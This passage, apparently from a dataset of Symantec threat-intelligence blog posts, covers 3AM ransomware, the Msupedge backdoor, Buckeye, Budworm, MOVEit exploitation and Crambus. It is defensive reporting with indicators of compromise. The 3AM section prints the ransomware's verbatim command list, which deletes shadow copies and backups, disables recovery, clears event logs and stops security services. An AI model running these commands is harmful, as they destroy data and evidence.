executable written in Rust and it recognises the following command-line parameters: - \"-k\" – 32 Base64 characters, referred to as \"Access key\" in the ransom note - \"-p\" – Unknown - \"-h\" – Unknown - \"-m\" – Method, where the code checks one of two values before running encryption logic: - \"local\" - \"net\" - \"-s\" – determines offsets within files for encryption to control encryption speed.\nThis is expressed in the form of decimal digits.\nThe command-line parameters \"-m\" and \"-h\" are mutually exclusive.\nThe usage of the “-h” and “-m” parameters and its values “local” and “net” are very similar to arguments used by Conti.\nWhen the malware is executed, it attempts to run the following commands, most of which attempt to stop various security and backup related software: \"netsh.exe\" advfirewall firewall set rule \"group=”Network Discovery”\" new enable=Yes \"wbadmin.exe\" delete systemstatebackup -keepVersions:0 -quiet \"wbadmin.exe\" DELETE SYSTEMSTATEBACKUP \"wbadmin.exe\" DELETE SYSTEMSTATEBACKUP -deleteOldest \"bcdedit.exe\" /set {default} recoveryenabled No \"bcdedit.exe\" /set {default} bootstatuspolicy ignoreallfailures \"wmic.exe\" SHADOWCOPY DELETE /nointeractive \"cmd.exe\" /c wevtutil cl security \"cmd.exe\" /c wevtutil cl system \"cmd.exe\" /c wevtutil cl application \"net\" stop /y vmcomp \"net\" stop /y vmwp \"net\" stop /y veeam \"net\" stop /y Back \"net\" stop /y xchange \"net\" stop /y backup \"net\" stop /y Backup \"net\" stop /y acronis \"net\" stop /y AcronisAgent \"net\" stop /y AcrSch2Svc \"net\" stop /y sql \"net\" stop /y Enterprise \"net\" stop /y Veeam \"net\" stop /y VeeamTransportSvc \"net\" stop /y VeeamNFSSvc \"net\" stop /y AcrSch \"net\" stop /y bedbg \"net\" stop /y DCAgent \"net\" stop /y EPSecurity \"net\" stop /y EPUpdate \"net\" stop /y Eraser \"net\" stop /y EsgShKernel \"net\" stop /y FA_Scheduler \"net\" stop /y IISAdmin \"net\" stop /y IMAP4 \"net\" stop /y MBAM \"net\" stop /y Endpoint \"net\" stop /y Afee \"net\" stop /y McShield \"net\" stop /y task \"net\" stop /y mfemms \"net\" stop /y mfevtp \"net\" stop /y mms \"net\" stop /y MsDts \"net\" stop /y Exchange \"net\" stop /y ntrt \"net\" stop /y PDVF \"net\" stop /y POP3 \"net\" stop /y Report \"net\" stop /y RESvc \"net\" stop /y Monitor \"net\" stop /y Smcinst \"net\" stop /y SmcService \"net\" stop /y SMTP \"net\" stop /y SNAC \"net\" stop /y swi_ \"net\" stop /y CCSF \"net\" stop /y ccEvtMgr \"net\" stop /y ccSetMgr \"net\" stop /y TrueKey \"net\" stop /y tmlisten \"net\" stop /y UIODetect \"net\" stop /y W3S \"net\" stop /y WRSVC \"net\" stop /y NetMsmq \"net\" stop /y ekrn \"net\" stop /y EhttpSrv \"net\" stop /y ESHASRV \"net\" stop /y AVP \"net\" stop /y klnagent \"net\" stop /y wbengine \"net\" stop /y KAVF \"net\" stop /y mfefire \"net\" stop /y svc$ \"net\" stop /y memtas \"net\" stop /y mepocs \"net\" stop /y GxVss \"net\" stop /y GxCVD \"net\" stop /y GxBlr \"net\" stop /y GxFWD \"net\" stop /y GxCIMgr \"net\" stop /y BackupExecVSSProvider \"net\" stop /y BackupExecManagementService \"net\" stop /y BackupExecJobEngine \"net\" stop /y BackupExecDiveciMediaService \"net\" stop /y BackupExecAgentBrowser \"net\" stop /y BackupExecAgentAccelerator \"net\" stop /y vss \"net\" stop /y BacupExecRPCService \"net\" stop /y CASAD2WebSvc \"net\" stop /y CAARCUpdateSvc \"net\" stop /y YooBackup \"net\" stop /y YooIT The ransomware will then scan the disk and any files matching predefined criteria are encrypted and the original files are deleted.\nThe malware will then create the file \"RECOVER-FILES.txt\" in each scanned folder.\nThis file contains the ransom note.\nThe encrypted files contain a marker string \"0x666\" followed by the data appended by the ransomware.\nAfter encryption, the malware attempts to run the following command to delete volume shadow backup copies: vssadmin.exe delete shadows /all /quiet Warning Signs Ransomware affiliates have become increasingly independent from ransomware operators and this is not the first time Symantec has seen an attacker attempt to deploy two different kinds of ransomware in a single attack.\nNew ransomware families appear frequently and most disappear just as quickly or never manage to gain significant traction.\nHowever, the fact that 3AM was used as a fallback by a LockBit affiliate suggests that it may be of interest to attackers and could be seen again in the future.\nProtection/Mitigation For the latest protection updates, please visit the Symantec Protection Bulletin.\nIndicators of Compromise If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file.\nSHA256 file hashes: 079b99f6601f0f6258f4220438de4e175eb4853649c2d34ada72cce6b1702e22 – LockBit 307a1217aac33c4b7a9cd923162439c19483e952c2ceb15aa82a98b46ff8942e – 3AM 680677e14e50f526cced739890ed02fc01da275f9db59482d96b96fbc092d2f4 – Cobalt Strike 991ee9548b55e5c815cc877af970542312cff79b3ba01a04a469b645c5d880af – Cobalt Strike ecbdb9cb442a2c712c6fb8aee0ae68758bc79fa064251bab53b62f9e7156febc – Cobalt Strike Network indicators: 185.202.0[.]111 212.18.104[.]6 85.159.229[.]62 Want to comment on this post?\nWe encourage you to share your thoughts on your favorite social platform.","num_sentences":44,"metadata":{"source":"blog","platform":"symantec","filename":"3AM"}}
{"id":129,"title":"New Backdoor Targeting Taiwan Employs Stealthy Communications | Symantec Enterprise Blogs","publish_date":null,"link":"https://symantec-enterprise-blogs.security.com/threat-intelligence/taiwan-malware-dns","clean_text":"New Backdoor Targeting Taiwan Employs Stealthy Communications Previously unseen backdoor communicates with command-and-control server using DNS traffic.\nA previously unseen backdoor (Backdoor.\nMsupedge) utilizing an infrequently seen technique was deployed in an attack against a university in Taiwan.\nThe most notable feature of this backdoor is that it communicates with a command-and-control (C&C) server via DNS traffic.\nWhile the technique is known and has been used by multiple threat actors, it is nevertheless something that is not often seen.\nMsupedge analysis Msupedge is a backdoor in the form of a dynamic link library (DLL).\nIt has been found installed in the following file paths: - csidl_drive_fixed\\xampp\\wuplog.dll - csidl_system\\wbem\\wmiclnt.dll While wuplog.dll is loaded by Apache (httpd.exe), the parent process for wmiclnt.dll is unknown.\nMsupedge uses DNS tunneling for communication with the C&C server.\nThe code for the DNS tunneling tool is based on the publicly available dnscat2 tool.\nIt receives commands by performing name resolution.\nThe host names that are resolved are structured as follows: Error notifications include the success or failure of the following: - Memory allocation - Decompression of received commands - Execution of received commands The backdoor also appears to encode the result of the command execution as a fifth-level domain and send it.\nMsupedge not only receives commands via DNS traffic but also uses the resolved IP address of the C&C server (ctl.msedeapi[.]net) as a command.\nThe third octet of the resolved IP address is a switch case.\nThe behavior of the backdoor will change based on the value of the third octet of the resolved IP address minus seven.\nFor example, if the third octet is 145, this translates to 138 (expressed in hexadecimal as 0x8a) Msupedge supports the following commands: - Case 0x8a : Create process.\nThe command is receive via DNS TXT record. -\nCase 0x75 : Download file.\nThe download URL is received via DNS TXT record. -\nCase 0x24 : Sleep (ip_4 * 86400 * 1000 ms). -\nCase 0x66 : Sleep (ip_4 * 3600 * 1000 ms). -\nCase 0x38 : Create %temp%\\1e5bf625-1678-zzcv-90b1-199aa47c345.tmp.\nThe purpose of this file is unknown. -\nCase 0x3c: Remove %temp%\\1e5bf625-1678-zzcv-90b1-199aa47c345.tmp.\nInfection vector The initial intrusion was likely through the exploit of a recently patched PHP vulnerability (CVE-2024-4577).\nThe vulnerability is a CGI argument injection flaw affecting all versions of PHP installed on the Windows operating system.\nSuccessful exploitation of the vulnerability can lead to remote code execution.\nSymantec has seen multiple threat actors scanning for vulnerable systems in recent weeks.\nTo date, we have found no evidence allowing us to attribute this threat and the motive behind the attack remains unknown.\nProtection/Mitigation For the latest protection updates, please visit the Symantec Protection Bulletin.\nIndicators of Compromise If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file.\ne08dc1c3987d17451a3e86c04ed322a9424582e2f2cb6352c892b7e0645eda43 – Backdoor.\nMsupedge f5937d38353ed431dc8a5eb32c119ab575114a10c24567f0c864cb2ef47f9f36 – Backdoor.\nMsupedge a89ebe7d1af3513d146a831b6fa4a465c8edeafea5d7980eb5448a94a4e34480 – Web shell Want to comment on this post?\nWe encourage you to share your thoughts on your favorite social platform.","num_sentences":34,"metadata":{"source":"blog","platform":"symantec","filename":"Buckeye copy"}}
{"id":130,"title":"Buckeye: Espionage Outfit Used Equation Group Tools Prior to Shadow Brokers Leak | Symantec Enterprise Blogs","publish_date":"2018-09-28","link":"https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/buckeye-windows-zero-day-exploit","clean_text":"Buckeye: Espionage Outfit Used Equation Group Tools Prior to Shadow Brokers Leak Windows zero day was exploited by Buckeye alongside Equation Group tools during 2016 attacks.\nExploit and tools continued to be used after Buckeye's apparent disappearance in 2017.\nKey Findings - The Buckeye attack group was using Equation Group tools to gain persistent access to target organizations at least a year prior to the Shadow Brokers leak. -\nVariants of Equation Group tools used by Buckeye appear to be different from those released by Shadow Brokers, potentially indicating that they didn't originate from that leak. -\nBuckeye's use of Equation Group tools also involved the exploit of a previously unknown Windows zero-day vulnerability.\nThis zero day was reported by Symantec to Microsoft in September 2018 and patched in March 2019. -\nWhile Buckeye appeared to cease operations in mid-2017, the Equation Group tools it used continued to be used in attacks until late 2018.\nIt is unknown who continued to use the tools.\nThey may have been passed to another group or Buckeye may have continued operating longer than supposed.\nThe 2017 leak of Equation Group tools by a mysterious group calling itself the Shadow Brokers was one of the most significant cyber security stories in recent years.\nEquation is regarded as one of the most technically adept espionage groups and the release of a trove of its tools had a major impact, with many attackers rushing to deploy the malware and exploits disclosed.\nOne of these tools, the EternalBlue exploit, was used to devastating effect in the May 2017 WannaCry ransomware outbreak.\nHowever, Symantec has now found evidence that the Buckeye cyber espionage group (aka APT3, Gothic Panda) began using Equation Group tools in attacks at least a year prior to the Shadow Brokers leak.\nBeginning in March 2016, Buckeye began using a variant of DoublePulsar (Backdoor.\nDoublepulsar), a backdoor that was subsequently released by the Shadow Brokers in 2017.\nDoublePulsar was delivered to victims using a custom exploit tool (Trojan.\nBemstour) that was specifically designed to install DoublePulsar.\nBemstour exploits two Windows vulnerabilities in order to achieve remote kernel code execution on targeted computers.\nOne vulnerability is a Windows zero-day vulnerability (CVE-2019-0703) discovered by Symantec.\nThe second Windows vulnerability (CVE-2017-0143) was patched in March 2017 after it was discovered to have been used by two exploit tools—EternalRomance and EternalSynergy—that were also released as part of the Shadow Brokers leak.\nThe zero-day vulnerability allows for the leaking of information and can be exploited in conjunction with other vulnerabilities to attain remote kernel code execution.\nIt was reported by Symantec to Microsoft in September 2018 and was patched on March 12, 2019.\nHow Buckeye obtained Equation Group tools at least a year prior to the Shadow Brokers leak remains unknown.\nBuckeye disappeared in mid-2017 and three alleged members of the group were indicted in the U.S. in November 2017.\nHowever, while activity involving known Buckeye tools ceased in mid-2017, the Bemstour exploit tool and the DoublePulsar variant used by Buckeye continued to be used until at least September 2018 in conjunction with different malware.\nHistory of attacks The Buckeye attack group had been active since at least 2009, when it began mounting a string of espionage attacks, mainly against organizations based in the U.S. The group has a record of exploiting zero-day vulnerabilities.\nThese include CVE-2010-3962 as part of an attack campaign in 2010 and CVE-2014-1776 in 2014.\nAlthough other zero-day attacks have been reported, they have not been confirmed by Symantec.\nAll zero-day exploits known, or suspected, to have been used by this group are for vulnerabilities in Internet Explorer and Flash.\nTimeline of attacks Beginning in August 2016, a group calling itself the Shadow Brokers began releasing tools it claimed to have originated from the Equation Group.\nIt initially released samples of the information it had, offering the full trove to the highest bidder.\nOver the coming months, it progressively released more tools, until April 2017, when it released a final, large cache of tools, including the DoublePulsar backdoor, the FuzzBunch framework, and the EternalBlue, EternalSynergy, and EternalRomance exploit tools.\nHowever, Buckeye had already been using some of these leaked tools at least a year beforehand.\nThe earliest known use of Equation Group tools by Buckeye is March 31, 2016, during an attack on a target in Hong Kong.\nDuring this attack, the Bemstour exploit tool was delivered to victims via known Buckeye malware (Backdoor.\nPirpi).\nOne hour later, Bemstour was used against an educational institution in Belgium.\nBemstour is specifically designed to deliver a variant of the DoublePulsar backdoor.\nDoublePulsar is then used to inject a secondary payload, which runs in memory only.\nThe secondary payload enables the attackers to access the affected computer even after DoublePulsar is removed.\nIt is worth noting that earlier versions did not include any means of uninstalling the DoublePulsar implant.\nThis functionality was added in later versions.\nA significantly improved variant of the Bemstour exploit tool was rolled out in September 2016, when it was used in an attack against an educational institution in Hong Kong.\nWhile the original variant was only capable of exploiting 32-bit systems, the new variant could exploit both 32-bit and 64-bit targets, adding support for newer Windows versions.\nAnother new feature of the payload in the second variant allowed the attacker to execute arbitrary shell commands on the infected computer.\nThis custom payload is also designed to copy arbitrary files and execute arbitrary processes on the targeted computer.\nWhen used against 32-bit targets, Bemstour still delivered the same DoublePulsar backdoor.\nHowever, against 64-bit targets it delivered only the custom payload.\nThe attackers typically used it to execute shell commands that created new user accounts.\nBemstour was used again in June 2017 in an attack against an organization in Luxembourg.\nUnlike earlier attacks when Bemstour was delivered using Buckeye’s Pirpi backdoor, in this attack Bemstour was delivered to the victim by a different backdoor Trojan (Backdoor.\nFilensfer).\nBetween June and September 2017, Bemstour was also used against targets in the Philippines and Vietnam.\nDevelopment of Bemstour has continued into 2019.\nThe most recent sample of Bemstour seen by Symantec appears to have been compiled on March 23, 2019, eleven days after the zero-day vulnerability was patched by Microsoft.\nThe purpose of all the attacks was to acquire a persistent presence on the victim’s network, meaning information theft was the most likely motive of the attacks.\n| | March 2016 | September 2016 | April 2017 | June 2017 | June 2017 | August 2017 | | |---|---|---|---|---|---|---|---| | Target locations | Hong Kong, Belgium | Hong Kong | Luxembourg | Philippines | Vietnam | || | Tools | Backdoor.\nPirpi | Unknown | Backdoor.\nFilensfer | Unknown | Unknown | || | Bemstour Exploit Tool (V1) | Bemstour Exploit Tool (V2) | Shadow Brokers Leak | Bemstour Exploit Tool (V1) | Bemstour Exploit Tool (V1 & V2) | Bemstour Exploit Tool (V2) | || | DoublePulsar | DoublePulsar (32-bit) or custom payload only (64-bit) | DoublePulsar | DoublePulsar (32-bit) or custom payload only (64-bit) | DoublePulsar (32-bit) or custom payload only (64-bit) | The Filensfer connection Filensfer is a family of malware that has been used in targeted attacks since at least 2013.\nSymantec has found multiple versions of the malware, including a C++ version, a compiled Python version (using py2exe), and a PowerShell version.\nOver the past three years, Filensfer has been deployed against organizations in Luxembourg, Sweden, Italy, the UK, and the U.S. Targets included organizations in the telecoms, media, and manufacturing sectors.\nWhile Symantec has never observed the use of Filensfer alongside any known Buckeye tools, information shared privately by another vendor included evidence of Filensfer being used in conjunction with known Buckeye malware (Backdoor.\nPirpi).\nBemstour exploit tool Bemstour exploits two Windows vulnerabilities in order to achieve remote kernel code execution on targeted computers.\nThe zero-day vulnerability found and reported by Symantec (CVE-2019-0703) occurs due to the way the Windows SMB Server handles certain requests.\nThe vulnerability allows for the leaking of information.\nThe second vulnerability (CVE-2017-0143) is a message type confusion vulnerability.\nWhen the two vulnerabilities are exploited together, the attacker can gain full access in the form of kernel mode code execution, enabling them to deliver malware to the targeted computer.\nWhen Bemstour was first used in 2016, both vulnerabilities were zero days, although CVE-2017-0143 was subsequently patched by Microsoft in March 2017 (MS17-010).\nCVE-2017-0143 was also used by two other exploit tools—EternalRomance and EternalSynergy—that were released as part of the Shadow Brokers leak in April 2017.\nBuckeye's exploit tool, EternalRomance, as well as EternalSynergy, can exploit the CVE-2017-0143 message type confusion vulnerability to perform memory corruption on unpatched victim computers.\nIn order to obtain remote code execution capabilities, all three exploit tools needed to collect information about the memory layout of attacked systems in addition to exploiting the aforementioned message type confusion vulnerability.\nEach tool performed this differently, relying on different vulnerabilities.\nIn the case of the Buckeye exploit tool, the attackers exploited their own zero-day vulnerability (CVE-2019-0703).\nDoublePulsar development The variant of DoublePulsar used in the first attacks performed by Buckeye was different to that leaked by the Shadow Brokers.\nIt appears to contain code to target newer versions of Windows (Windows 8.1 and Windows Server 2012 R2), indicating that it is a newer version of the malware.\nIt also includes an additional layer of obfuscation.\nBased on technical features and timing, it is possible that this obfuscation was created by DoublePulsar's original authors.\nIt is noteworthy that the attackers never used the FuzzBunch framework in its attacks.\nFuzzBunch is a framework designed to manage DoublePulsar and other Equation Group tools and was leaked by the Shadow Brokers in 2017.\nThis suggests that Buckeye only managed to gain access to a limited number of Equation Group tools.\nUnanswered questions There are multiple possibilities as to how Buckeye obtained Equation Group tools before the Shadow Brokers leak.\nBased on the timing of the attacks and the features of the tools and how they are constructed, one possibility is that Buckeye may have engineered its own version of the tools from artifacts found in captured network traffic, possibly from observing an Equation Group attack.\nOther less supported scenarios, given the technical evidence available, include Buckeye obtaining the tools by gaining access to an unsecured or poorly secured Equation Group server, or that a rogue Equation group member or associate leaked the tools to Buckeye.\nMystery also surrounds the continued use of the exploit tool and DoublePulsar after Buckeye's apparent disappearance.\nIt may suggest that Buckeye retooled following its exposure in 2017, abandoning all tools publicly associated with the group.\nHowever, aside from the continued use of the tools, Symantec has found no other evidence suggesting Buckeye has retooled.\nAnother possibility is that Buckeye passed on some of its tools to an associated group.\nProtection Symantec has the following protection in place to protect customers against these attacks: File-based protection Network-based protection (Intrusion Prevention System) Indicators of Compromise | MD5 | SHA256 | Description | |---|---|---| | 7020bcb347404654e17f6303848b7ec4 | cbe23daa9d2f8e1f5d59c8336dd5b7d7ba1d5cf3f0d45e66107668e80b073ac3 | Pirpi (first variant) | | aacfef51a4a242f52fbb838c1d063d9b | 53145f374299e673d82d108b133341dc7bee642530b560118e3cbcdb981ee92c | Pirpi (second variant) | | c2f902f398783922a921df7d46590295 | 01f53953db8ba580ee606043a482f790082460c8cdbd7ff151d84e03fdc87e42 | Command line utility to list user accounts on remote machine | | 6458806a5071a7c4fefae084791e8c67 | 6b1f8b303956c04e24448b1eec8634bd3fb2784c8a2d12ecf8588424b36d3cbc | Filensfer (C/C++) | | 0d2d0d8f4989679f7c26b5531096b8b2 | 7bfad342ce88de19d090a4cb2ce332022650abd68f34e83fdc694f10a4090d65 | Filensfer (Powershell) | | a3932533efc04ac3fe89fb5b3d60128a | 3dbe8700ecd27b3dc39643b95b187ccfd44318fc88c5e6ee6acf3a07cdaf377e | Filensfer (py2exe) | | 58f784c7a292103251930360f9ca713e | 1c9f1c7056864b5fdd491d5daa49f920c3388cb8a8e462b2bc34181cef6c1f9c | Command line SMB client | | a469d48e25e524cf0dec64f01c182b25 | 951f079031c996c85240831ea1b61507f91990282daae6da2841311322e8a6d7 | HTran | Threat intelligence In addition to file-based protection, customers of the DeepSight Intelligence Managed Adversary and Threat Intelligence (MATI) service have received reports on Buckeye, which detail methods of detecting and thwarting activities of this group.\nWant to comment on this post?\nWe encourage you to share your thoughts on your favorite social platform.","num_sentences":91,"metadata":{"source":"blog","platform":"symantec","filename":"Buckeye"}}
{"id":131,"title":"Budworm: APT Group Uses Updated Custom Tool in Attacks on Government and Telecoms Org | Symantec Enterprise Blogs","publish_date":"2023-08-28","link":"https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/budworm-tool-update-telecoms-govt","clean_text":"Budworm: APT Group Uses Updated Custom Tool in Attacks on Government and Telecoms Org Previously unseen version of SysUpdate used in August 2023 campaign.\nThe Budworm advanced persistent threat (APT) group continues to actively develop its toolset.\nMost recently, the Threat Hunter Team in Symantec, part of Broadcom, discovered Budworm using an updated version of one of its key tools to target a Middle Eastern telecommunications organization and an Asian government.\nBoth attacks occurred in August 2023.\nBudworm (aka LuckyMouse, Emissary Panda, APT27) deployed a previously unseen variant of its SysUpdate backdoor (SysUpdate DLL inicore_v2.3.30.dll).\nSysUpdate is exclusively used by Budworm.\nAs well as its custom malware, Budworm also used a variety of living-off-the-land and publicly available tools in these attacks.\nIt appears the activity by the group may have been stopped early in the attack chain as the only malicious activity seen on infected machines is credential harvesting.\nTools Used Budworm executes SysUpdate on victim networks by DLL sideloading the payload using the legitimate INISafeWebSSO application.\nThis technique has been used by the group for some time, with reports of INISafeWebSSO being leveraged dating as far back as 2018.\nDLL sideloading attacks use the DLL search order mechanism in Windows to plant and then invoke a legitimate application that executes a malicious payload.\nIt can help attackers evade detection.\nSysUpdate is a feature-rich backdoor that has multiple capabilities, including: - List, start, stop, and delete services - Take screenshots - Browse and terminate processes - Drive information retrieval - File management (finds, deletes, renames, uploads, downloads files, and browses a directory) - Command execution Trend Micro reported in March 2023 that Budworm had developed a Linux version of SysUpdate with similar capabilities to the Windows version.\nSysUpdate has been in use by Budworm since at least 2020, and the attackers appear to continually develop the tool to improve its capabilities and avoid detection.\nAs well as SysUpdate, the attackers used a number of legitimate or publicly available tools to map the network and dump credentials.\nTools used by the attackers in this campaign included: - AdFind: A publicly available tool that is used to query Active Directory.\nIt has legitimate uses but is widely used by attackers to help map a network. -\nCurl: An open-source command-line tool for transferring data using various network protocols. -\nSecretsDump: A publicly available tool that can perform various techniques to dump secrets from the remote machine without executing any agent.\nTechniques include reading SAM and LSA secrets from registries, dumping NTLM hashes, plaintext credentials, and Kerberos keys, as well as dumping the NTDS.dit Active Directory database. -\nPasswordDumper: A password-dumping tool.\nBudworm Background Budworm is a long-running APT group that is believed to have been active since at least 2013.\nThe attackers are known for their targeting of high-value victims, often focusing on organizations in the government, technology, and defense sectors.\nBudworm has targeted victims in many countries in Southeast Asia and the Middle East, among other locations, including the U.S. Symantec’s Threat Hunter Team published a blog in October 2022 detailing how Budworm activity was seen on the network of a U.S. state legislature.\nIn that campaign, the attackers also targeted the government of a Middle Eastern country, a multinational electronics manufacturer, and a hospital in Southeast Asia.\nThe attackers also leveraged DLL sideloading in that campaign to load their HyperBro malware.\nThe victims in this campaign — a government in Asia and a telecommunications company in the Middle East — do align with the kinds of victims we often see Budworm targeting.\nThe targeting of a telecommunications company and government also point to the motivation behind the campaign being intelligence gathering, which is the motivation that generally drives Budworm activity.\nThat Budworm continues to use a known malware (SysUpdate), alongside techniques it is known to favor, such as DLL sideloading using an application it has used for this purpose before, indicate that the group isn’t too concerned about having this activity associated with it if it is discovered.\nThe use of a previously unseen version of the SysUpdate tool also demonstrates that the group is continuing to actively develop its toolset.\nThe fact that this activity occurred as recently as August 2023 suggests that the group is currently active, and that those organizations that may be of interest to Budworm should be aware of this activity and the group’s current toolset.\nProtection/Mitigation For the latest protection updates, please visit the Symantec Protection Bulletin.\nIndicators of Compromise If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file.\nSHA256 file hashes c501203ff3335fbfc258b2729a72e82638719f60f7e6361fc1ca3c8560365a0e — Legitimate INISafeWebSSO application c4f7ec0c03bcacaaa8864b715eb617d5a86b5b3ca6ee1e69ac766773c4eb00e6 — SysUpdate backdoor 551397b680da0573a85423fbb0bd10dac017f061a73f2b8ebc11084c1b364466 — Password dumper df571c233c3c10462f4d88469bababe4c57c21a52cca80f2b1e1af848a2b4d23 — Hacktool c3405d9c9d593d75d773c0615254e69d0362954384058ee970a3ec0944519c37 — SecretsDump f157090fd3ccd4220298c06ce8734361b724d80459592b10ac632acc624f455e — AdFind ee9dfcea61282b4c662085418c7ad63a0cbbeb3a057b6c9f794bb32455c3a79e — Curl Want to comment on this post?\nWe encourage you to share your thoughts on your favorite social platform.","num_sentences":35,"metadata":{"source":"blog","platform":"symantec","filename":"Budworm"}}
{"id":132,"title":"MOVEit Vulnerabilities: What You Need to Know | Symantec Enterprise Blogs","publish_date":null,"link":"https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/moveit-vulnerabilities-exploits","clean_text":"MOVEit Vulnerabilities: What You Need to Know Symantec products guard against exploitation of vulnerabilities that are being actively exploited by cyber-crime actors.\nExtortion actors have been actively exploiting a recently patched vulnerability in MOVEit Transfer, a file-transfer application that is widely used to transmit information between organizations.\nThe nature of the software affected means that attackers can exploit unpatched systems to mount a supply chain attack against multiple organizations.\nWhile the original vulnerability (CVE-2023-34362) was patched on May 31, MOVEit Transfer’s developers announced on Friday (June 9) that multiple additional vulnerabilities (CVEs pending) have also been identified and patched.\nPrior to its patching, attackers linked to the Clop ransomware operation were already exploiting CVE-2023-34362 as a zero-day vulnerability.\nProof-of-concept code for the exploit is now publicly available, meaning other attackers are now likely to attempt to exploit unpatched systems.\nWhat is MOVEit Transfer?\nMOVEit Transfer is a managed file-transfer application developed by Progress Software.\nIt is designed to permit secure transfer of files between businesses and their customers.\nWhat is the nature of the vulnerability?\nThe original vulnerability (CVE-2023-34362) occurs in the MOVEit Transfer web application.\nIt affected all versions prior to 2021.0.6 (13.0.6), 2021.1.4 (13.1.4), 2022.0.4 (14.0.4), 2022.1.5 (14.1.5), and 2023.0.1 (15.0.1). “[\nAn] attacker may be able to infer information about the structure and contents of the database in addition to executing SQL statements that alter or delete database elements,” Progress said.\nFor how long was the vulnerability being exploited before it was patched?\nAccording to a U.S. government advisory, active exploitation appears to have begun on May 27, 2023.\nHow has the vulnerability been exploited to date?\nThe vulnerability is being actively exploited by the Clop ransomware operation.\nAccording to a joint advisory issued by the U.S. Federal Bureau of Investigation (FBI) and the Cybersecurity and Infrastructure Security Agency (CISA), the attackers exploited the vulnerability to install a web shell called Lemurloot (JS.Malscript!g1) on affected systems.\nThis was then used to steal data from underlying databases.\nLemurloot was designed specifically to target the MOVEit Transfer platform.\nIt authenticates incoming HTTPS requests via a hard-coded password; runs commands that will download files from the MOVEit Transfer database; extracts its Azure system settings; retrieves records; and can create, insert, or delete a particular user.\nWhen responding to a request, Lemurloot returns stolen data in a comfile format.\nShortly after the disclosure of the vulnerability, attackers linked to the Clop ransomware operation claimed responsibility for the attack and said that they had stolen data from multiple MOVEit users and their customers.\nIt threatened to release the stolen data unless a ransom is paid.\nWhat is known about Clop?\nClop is an extortion and ransomware operation run by a cyber-crime group known as Snakefly (aka TA505, FIN11).\nWhile the group initially extorted victims by encrypting files using its own ransomware payload (Ransom.\nClop), in recent times it has been known to eschew encryption entirely and rely on the threat of leaking stolen data to extort its victims.\nThe group has a track record in exploiting zero-day vulnerabilities.\nIn 2021, it was linked to the exploitation of multiple vulnerabilities in Accellion FTA, another file-transfer application.\nEarlier this year it was responsible for exploiting a zero-day vulnerability (CVE-2023-0669) in the GoAnywhere MFT platform.\nHow do Symantec products guard against exploitation of this vulnerability?\nSymantec products will guard against exploit attempts and payloads with the following detections: File-based - JS.Malscript!g1 - Trojan Horse - Trojan.\nGen.2 - Trojan.\nGen.NPE - Trojan.\nMalscript - Trojan.\nWebshell - WS.Malware.1 - WS.Malware.2 Machine learning-based - Heur.\nAdvML.C Network-based - Attack: MOVEit Transfer RCE CVE-2023-34362 Policy-based Data Center Security (DCS) default hardening policies such as sym_win_hardened_sbp provide 0-day protection for CVE-2023-34362.\nDCS policy control \"Software Install Restrictions\" for MS SQL, MS IIS and other hardened application sandboxes stop Clop ransomware from exploiting this vulnerability by preventing arbitrary deployment of webshells and unauthorized software.\nWeb-based Observed domains/IPs are covered under security categories.\nProtection/Mitigation For the latest protection updates, please visit the Symantec Protection Bulletin.\nWant to comment on this post?\nWe encourage you to share your thoughts on your favorite social platform.","num_sentences":43,"metadata":{"source":"blog","platform":"symantec","filename":"Clop"}}
{"id":133,"title":"Crambus: New Campaign Targets Middle Eastern Government | Symantec Enterprise Blogs","publish_date":"2023-09-28","link":"https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/crambus-middle-east-government","clean_text":"Crambus: New Campaign Targets Middle Eastern Government Iran-linked attackers compromised multiple computers and servers over the course of eight months.\nThe Iranian Crambus espionage group (aka OilRig, APT34) staged an eight-month-long intrusion against a government in the Middle East between February and September 2023.\nDuring the compromise, the attackers stole files and passwords and, in one case, installed a PowerShell backdoor (dubbed PowerExchange) that was used to monitor incoming mails sent from an Exchange Server in order to execute commands sent by the attackers in the form of emails, and surreptitiously forwarded results to the attackers.\nMalicious activity occurred on at least 12 computers and there is evidence that the attackers deployed backdoors and keyloggers on dozens more.\nIn addition to deploying malware, the attackers made frequent use of the publicly available network administration tool Plink to configure port-forwarding rules on compromised machines, enabling remote access via the Remote Desktop Protocol (RDP).\nThere is also evidence the attackers modified Windows firewall rules in order to enable remote access.\nBackground Crambus is a long-running Iranian espionage group that has mounted operations against targets in multiple countries, including Saudi Arabia, Israel, the United Arab Emirates, Iraq, Jordan, Lebanon, Kuwait, Qatar, Albania, the U.S., and Turkey.\nThe group is known to stage long-running intrusions for intelligence gathering and spying purposes.\nIn recent years it has added a heavy social engineering component to the early stages of its attacks.\nIt most recently came to attention last year, when Microsoft linked the group to a destructive attack against the Albanian government.\nIt assessed that Crambus was involved in gaining initial access and exfiltrating data from impacted networks.\nWipers were likely then deployed by other Iran-linked actors.\nToolset Used During this latest attack, Crambus deployed three previously undiscovered pieces of malware, along with the PowerExchange backdoor, a known backdoor that hadn’t yet been attributed to Crambus.\nIn addition to malware, the attackers made use of a number of living-off-the-land and legitimate tools. -\nBackdoor.\nTokel: Has the ability to execute arbitrary PowerShell commands and download files.\nThe command and control (C&C) address is stored in a separate, RC4 encrypted file called token.bin, which is saved in the working directory. -\nTrojan.\nDirps: Used to enumerate all files in a directory and execute PowerShell commands. -\nInfostealer.\nClipog: Information stealing malware that is capable of copying clipboard data, capturing keystrokes and logging processes where keystrokes are entered. -\nBackdoor.\nPowerExchange: PowerShell-based malware that can log into an Exchange Server with hardcoded credentials and monitor for emails sent by the attackers.\nIt uses an Exchange Server as a C&C. Mails received with “@@\" in the subject contain commands sent from the attackers which allows them to execute arbitrary PowerShell commands, write files and steal files.\nThe malware creates an Exchange rule (called ‘defaultexchangerules’) to filter these messages and move them to the Deleted Items folder automatically. -\nMimikatz: Publicly available credential dumping tool. -\nPlink: A command-line connection tool for the PuTTY SSH client Attack Timeline The first evidence of malicious activity on the target’s network occurred on February 1, 2023, when an unknown PowerShell script (file name: joper.ps1) was executed from a suspicious directory: CSIDL_PROFILE\\public\\sat.\nThe same script was executed multiple times on the same computer (Computer 1) over the next seven days.\nFour days later, on February 5, the attackers accessed a second computer (Computer 2) and a renamed version of Plink (msssh.exe), a command-line connection tool for the PuTTY SSH client, was used to configure 